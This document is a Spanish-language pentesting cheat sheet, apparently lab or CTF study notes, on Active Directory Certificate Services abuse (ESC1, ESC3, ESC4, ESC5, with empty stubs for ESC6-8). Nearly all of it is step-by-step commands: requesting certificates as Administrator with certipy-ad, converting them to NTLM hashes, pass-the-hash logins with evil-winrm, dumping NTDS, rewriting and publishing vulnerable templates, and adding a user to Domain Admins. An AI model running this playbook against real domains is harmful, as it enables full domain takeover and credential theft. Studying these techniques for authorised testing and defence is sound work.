# ADCS Attacks 

Tags: #Windows #PrivEsc #ESC #Linux #ADCS 

Es un servicio de infraestructura de clave pública de Microsoft
	- Emitir
	- Administrar
	- Publicar / Revocar certificados digitales 

Utilidades practicas:
	- Emitir certificados para autenticación en computadores / servidores
	- Acceder a redes Wifi EMpresariales (WPA - Enterprise)
	- Acceder a redes VPN

Componentes:
- CA (Autoridad Certificadora)
- Certificate Templates 
	- Quien emite el certificado
	- Duración 
	- Quien puede usarlo 
	- Los permisos 

## Enumeración General 

```bash 
# Identificar la CA, servidores de inscripción y Web Enrollment
❯ nxc ldap IP_DC -u user -p 'P@$$w0rd123!' -M adcs 

	Found PKI Enrollment Server:
	Found CN:  

# Obtener información del grupo ca-operators, incluyendo sus miembros
❯ nxc ldap IP_DC -u user -p 'P@$$w0rd123!' --group ca-operators
```

## ESC 1

El atacante puede pedir un certificado en nombre de OTRO USUARIO. (Modificar quien eres)

```bash 
# Enumerar plantillas y detectar vulnerabilidades
❯ certipy-ad find -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout 

Donde se obtiene:
	- CA Name 
	- Template Name  
```

```bash
Paso 1:
# Solicitar un certificado como Administrador 
❯ certipy-ad req -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -ca 'CA' -template 'DunderMifflinAuthentication' -upn 'Administrator@domain.local' -target IP_DC 

	# ca = Certificate Authority (CA), se obtiene del comando 'find' 
	# template = Nombre de la plantilla vulnerable 
	# upn = Es la identidad que quieres que represente el certificado (Administrator)

NOTA:
	- Se obtiene un archivo llamado 'administrator.pfx'

Paso 2:
# Autenticarse usando el certificado obtenido un TGT para obtener el HASH NTLM
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC

Paso 3:
# Conectarse al server como Administrator 
❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

## ESC 3

El atacante puede pedir un certificado en nombre de OTRO USUARIO. (Para utilizar o reemplazar a otra persona)

```bash 
# Enumerar plantillas y detectar vulnerabilidades
❯ certipy-ad find -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout 

Donde se obtiene:
	- CA Name 
	- Template Name  
```

```bash 
Paso 1:
# Solicitar un certificado para obtener un archivo llamado 'file.pfx'
❯ certipy-ad req -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -ca 'CA' -template 'DunderMifflinAuthentication' -target IP_DC 

Paso 2:
# Solicitar un certificado como Administrador 
❯ certipy-ad req -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -ca 'CA' -template 'User' -on-behalf-of 'domain.local\administrator' -pfx <file.pfx> -target IP_DC 

	# template = Se usa la plantilla 'User'
	# on-behalf-of = Mencionar que es en representación del usuario administrador

NOTA:
	- Se obtiene un archivo llamado 'administrator.pfx'

Paso 3:
# Autenticarse usando el certificado obtenido un TGT para obtener el HASH NTLM
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC

Paso 4:
# Conectarse al server como Administrator 
❯ nxc smb IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff --ntds 
❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

## ESC 4

Una vulnerabilidad de quien tiene permisos de escritura sobre LA PLANTILLA, se puede modificar su configuración ESC4 y hacerla explotable al ESC1.

En BloodHound buscar una `CertTemplate` donde mi usuario o un grupo al que pertenezco tenga permisos como:

- `GenericAll`
- `GenericWrite`
- `WriteDacl`
- `WriteOwner`

Ejemplo: 

* El icono en BloodHound, la **plantilla de certificado (Certificate Template)** aparece representada con el **icono de un certificado/documento** color morado.

- CA_SVC → MemberOf → CERT PUBLISHERS → GenericAll → DunderMifflinAuthentication
- Si el usuario en BloodHound pertenece al grupo **CA-OPERATOS o CERT PUBLISHERS** puede ser propenso al ESC4.  
* El usuario en su **Display Name = Certification Authority**

En BloodHound si se tiene permisos de **GenericAll** sobre la `CertTemplate`.

```bash 
# Enumerar plantillas y detectar vulnerabilidades
❯ certipy-ad find -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout 

	# u = Usuario con los privilegios sobre el Template 
	# p = Password del usuario con privilegios

Donde se obtiene:
	- CA Name 
	- Template Name  

NOTA:
	- Sin '-stdout' guarda la salida en diferentes archivos 
```

```bash 
Paso 1:
# Guardar la configuración original en un archivo Json
❯ certipy-ad template -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -template 'DunderMifflinAuthentication' -save-configuration Original.json

	# u = Usuario con los privilegios sobre el Template 
	# p = Password del usuario con privilegios
	# template = Nombre de la plantilla vulnerable 

Paso 2:
# Modificar la plantilla vulnerable (ESC4) para volverlo ESC1
❯ certipy-ad template -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -template 'DunderMifflinAuthentication' -write-default-configuration

	# Escribir 'Y' para sobreescribir la plantilla 
```

```bash 
Paso 3: (OPCIÓN A) - Si el AD es antiguo usar esto
# Solicitar un certificado como Administrador 
❯ certipy-ad req -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -ca 'CA' -template 'DunderMifflinAuthentication' -upn 'Administrator@domain.local' -target IP_DC

	# ca = Certificate Authority (CA), se obtiene del comando 'find' 
	# upn = Es la identidad que quieres que represente el certificado (Administrator)

NOTA:
	- Se obtiene un archivo llamado 'administrator.pfx'

Paso 4:
# Autenticarse usando el certificado obtenido y obtener el HASH NTLM
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC

Paso 5:
# Conectarse al server como Administrator 
❯ nxc smb IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff --ntds 
❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

```bash 
Paso 3: (OPCIÓN B) - Si el AD es moderno esta es la mejor opción 
# Obtener el SID del AD 
❯ nxc ldap 10.129.234.66 -u user -p 'P@$$w0rd123!' --get-sid
	Domain SID S-1-5-21-3085872742-570972823-736764132

# Solicitar un certificado como Administrador 
❯ certipy-ad req -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -ca 'CA' -target IP_DC -template 'SendaiComputer' -upn 'Administrator@domain.local' -sid S-1-5-21-3085872742-570972823-736764132-500
	# Colocar el -500 al final del sid ya que se refiere al usuario admin

Paso 4:
# Autenticarse usando el certificado obtenido y obtener unaa shell ldap
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC -ldap-shell 
	❯ add_user_to_group <user> "Domain Admins"  # Agregar un usuario 
	❯ exit   # Salir

Paso 5:
# Verifiar si se ha agregado el usuario 
❯ nxc smb 10.129.234.66 -u user -p 'P@$$w0rd123!'

Paso 6:
# Ingresar 
❯ evil-winrm -i IP_DC -u user -p 'P@$$w0rd123!'
```

## ESC 5

Se tiene permisos **GenericAll** sobre todo el objeto de la CA. 
Pasos:
	1. Buscar plantilla 'Vulnerable' pero NO PUBLICADA.
	2. Identificar que se tiene permisos totales 
	3. Publicar la plantilla vulnerable.

```bash 
Paso 1:
# Enumerar todas las plantillas
❯ certipy-ad find -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -stdout 

Donde se obtiene:
	- CA Name 
	- Template Name 
	- Enabled = FALSE   # Quiere decir que la plantilla no esta publicada 
	- Enrollee Supplies Subject = TRUE   # Quiere decir que vulnerable a ESC1
```

```bash 
Paso 2:
# Se buscan los permisos 
❯ bloodyad --host IP_DC -d enterprise.com -u user -p 'P@$$w0rd123!' get object "CN=Public Key Services,CN=Services,CN=Configuration,DC=enterprise,DC=com" --attr nTSecurityDescriptor --resolve-sd

	# Se busca el permiso de 'GenericAll'

❯ bloodyad --host IP_DC -d enterprise.com -u user -p 'P@$$w0rd123!' get object "CN=192.168.5.100,CN=Public Key Services,CN=Services,CN=Configuration,DC=enterprise,DC=com" --attr nTSecurityDescriptor --resolve-sd

# Muestra las plantillas habilitadas 
❯ bloodyad --host IP_DC -d enterprise.com -u user -p 'P@$$w0rd123!' get object "CN=192.168.5.100,CN=Public Key Services,CN=Services,CN=Configuration,DC=enterprise,DC=com" --attr certificateTemplates
```

```bash 
Paso 3:
# Publicar todas la plantillas 
❯ bloodyad --host IP_DC -d enterprise.com -u user -p 'P@$$w0rd123!' set object "CN=192.168.5.100,CN=Public Key Services,CN=Services,CN=Configuration,DC=enterprise,DC=com" certificateTemplates -v <Template>
```

```bash 
Paso 4:
# Solicitar un certificado como Administrador 
❯ certipy-ad req -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -ca 'CA' -template '<Template>' -upn 'Administrator@domain.local' -target IP_DC 

	# ca = Certificate Authority (CA), se obtiene del comando 'find' 
	# template = Nombre de la plantilla vulnerable 
	# upn = Es la identidad que quieres que represente el certificado (Administrator)

NOTA:
	- Se obtiene un archivo llamado 'administrator.pfx'

Paso 5:
# Autenticarse usando el certificado obtenido un TGT para obtener el HASH NTLM
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC

Paso 6:
# Conectarse al server como Administrator 
❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

## ESC 6

```bash 
# Enumerar plantillas y detectar vulnerabilidades
❯ certipy-ad find -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout 

Donde se obtiene:
	- CA Name 
	- Template Name  
```

## ESC 7

```bash 
# Enumerar plantillas y detectar vulnerabilidades
❯ certipy-ad find -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout 

Donde se obtiene:
	- CA Name 
	- Template Name  
```

## ESC 8

```bash 

```